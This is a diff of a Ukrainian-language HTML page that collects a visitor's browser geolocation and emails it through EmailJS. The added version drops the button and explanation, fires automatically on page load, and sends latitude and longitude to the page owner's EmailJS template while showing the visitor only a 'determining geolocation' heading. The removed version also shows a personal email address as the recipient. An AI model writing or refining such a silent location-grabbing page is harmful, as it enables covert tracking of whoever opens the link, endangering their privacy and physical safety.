@@ -1,67 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Геолокація</title>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Location</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function () {
+      // Ініціалізація EmailJS
+      emailjs.init('cordinantsss'); // Замініть your_user_id на ваш User ID із EmailJS
+    })();
+
+    function sendLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // Дані для надсилання
+          const templateParams = {
+            latitude: latitude,
+            longitude: longitude,
+          };
+
+          // Надсилання листа через EmailJS
+          emailjs
+            .send('service_ogjvqtm', 'template_revjutn', templateParams)
+            .then(
+              response => {
+                alert("Координати успішно надіслані!");
+              },
+              error => {
+                console.error("Помилка надсилання:", error);
+                alert("Не вдалося надіслати координати.");
+              }
+            );
+        });
+      } else {
+        alert("Ваш браузер не підтримує геолокацію.");
+      }
+    }
+
+    // Виклик функції автоматично при завантаженні сторінки
+    window.onload = sendLocation;
+  </script>
 </head>
 <body>
-    <h1>Отримати Геолокацію та Відправити на Пошту</h1>
-    <button onclick="getLocation()">Отримати Місцезнаходження</button>
-    <p id="location">Місцезнаходження не визначено.</p>
-
-    <script>
-        // Ініціалізація EmailJS
-        emailjs.init('deputat');  // Ваш user_id
-
-        // Функція для отримання геолокації
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendEmail, showError);
-            } else {
-                document.getElementById("location").innerHTML = "Геолокація не підтримується вашим браузером.";
-            }
-        }
-
-        // Відправка email
-        function sendEmail(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            var message = "Широта: " + latitude + "\nДовгота: " + longitude;
-
-            // Відправка email через EmailJS
-            var templateParams = {
-                to_email: 'vov4yka@ukr.net',  // Ваша електронна адреса
-                subject: 'Геолокація користувача',
-                message: message
-            };
-
-            emailjs.send('service_5bljyug', 'template_qif1yci', templateParams)  // Ваш service_id і template_id
-                .then(function(response) {
-                    document.getElementById("location").innerHTML = "Дані надіслано на вашу пошту!";
-                }, function(error) {
-                    document.getElementById("location").innerHTML = "Сталася помилка при відправці.";
-                });
-        }
-
-        // Обробка помилок
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "Користувач відмовився від доступу до геолокації.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Інформація про місцезнаходження недоступна.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "Час запиту геолокації вичерпано.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "Невідома помилка.";
-                    break;
-            }
-        }
-    </script>
+  <h1>Визначення геолокації...</h1>
 </body>
 </html>
